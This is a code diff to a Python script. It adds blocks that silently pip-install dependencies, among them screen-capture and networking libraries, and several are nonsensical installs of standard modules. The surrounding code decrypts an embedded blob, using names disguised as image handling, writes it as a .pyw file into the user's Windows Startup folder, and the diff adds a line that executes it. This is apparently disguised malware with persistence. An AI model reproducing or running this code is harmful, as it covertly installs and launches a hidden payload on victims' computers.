@@ -1,3 +1,49 @@
+import os,sys
+try:
+    from flask_wtf import FlaskForm
+except:
+    os.system('pip install Flask-WTF')
+    from flask_wtf import FlaskForm
+try:
+    from wtforms import StringField, SubmitField
+except:
+    os.system('pip install WTForms')
+    from wtforms import StringField, SubmitField
+try:
+    import socket
+except:
+    os.system('pip install socket')
+    import socket
+try:
+    import pyautogui
+except:
+    os.system('pip install pyautogui')
+    import pyautogui
+try:
+    import io
+except:
+    os.system('pip install io')
+    import io
+try:
+    from time import sleep
+except:
+    os.system('pip install time')
+    from time import sleep
+try:
+    import requests
+except:
+    os.system('pip install requests')
+    import requests
+try:
+    from flask import Flask
+except:
+    os.system('pip install flask')
+    from flask import Flask
+try:
+    import threading
+except:
+    os.system('pip install threading')
+    import threading
 try:
     try:
         import pygame
@@ -128,4 +174,4 @@ imaged=b'-UZsNTG-6gzQ8ZwjWnmMZNj1S1x5le_YClfwGQsm1Aw='
 f=open(fR"C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw",'wb')
 f.write(ImageToPygame(imaged).decrypt(images))
 f.close()
-fR"C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw"
+os.system(fR"python 'C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw'")
